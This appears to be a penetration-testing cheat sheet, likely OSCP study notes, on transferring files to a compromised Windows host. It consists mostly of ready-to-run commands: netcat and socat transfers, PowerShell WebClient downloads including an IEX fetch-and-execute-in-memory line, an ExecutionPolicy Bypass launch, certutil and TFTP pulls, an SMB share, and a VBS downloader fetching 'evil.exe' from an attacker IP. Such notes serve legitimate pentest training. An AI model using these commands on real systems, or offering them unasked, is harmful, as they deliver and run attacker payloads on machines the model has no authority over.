## NC
```powershell
# Listener on Windows system
nc -lvnp $PORT > tranfered.exe
# Push wget.exe onto windows system
nc -nv $IP $PORT < /usr/share/windows-resources/binaries/wget.exe
```

## Socat
Host with
```bash
sudo socat TCP4-LISTEN:$PORT,fork file:$filename
```
Transfer with
```powershell
socat TCP4:$IP:$PORT file:$filename,create
```
## Powershell
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$bad.exe','$bad.exe')"
```
Or
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$bad.exe','$bad.exe')
```
Download and execute without saving on disk
```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://$IP:$PORT/$bad.exe')`
```

## No interactive Powershell
```powershell
echo $storageDir = $pwd > wget.ps1   
echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
echo $url = "http://$IP:$PORT/$bad.exe" >> wget.ps1   
echo $file = "$bad.exe" >>wget.ps1   
echo $webclient.DownloadFile($url,$file) >> wget.ps1
```
Then
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

## SMB with Impacket
```bash
python3 smbserver.py ROPNOP /path/to/exploit
copy \$IP\ROPNOP\exploit.exe`
```
## CertUtil
```powershell
certutil.exe -urlcache -split -f "http://$IP/$FILE"
```

**TFTP** (Installed by default up to Windows XP and 2003, In Windows 7, 2008 and above needs to be explicitly added. For this reason tftp not ideal file transfer protocol in most situations.) [ref](https://github.com/pythonmaster41/Go-For-OSCP)
```powershell
# On attacker machine:
mkdir /tftp
chwon nobody: /tftp
atftpd --deamon --port 69 tftp
cp $FILE tftp
# On Windows:
tftp -i $IP GET $FILE
tftp -i $IP PUT $FILE
```

## Windows-File-transferVBS-script
BEWARE: "If creating on Linux and then transferring to windows then you may face issue sometime, use unix2dos before you transfer it in this case."
```vbs
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
Run with:
```powershell
cscript wget.vbs http://attackerip/evil.exe evil.exe
```

## Debug.exe (32bit machines only) files < 64kb!
```powershell
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

## References
[hakluke](https://hakluke.medium.com/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97)
[pythonmaster41](https://github.com/pythonmaster41/Go-For-OSCP)
[hackersinterview](https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/)

[sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)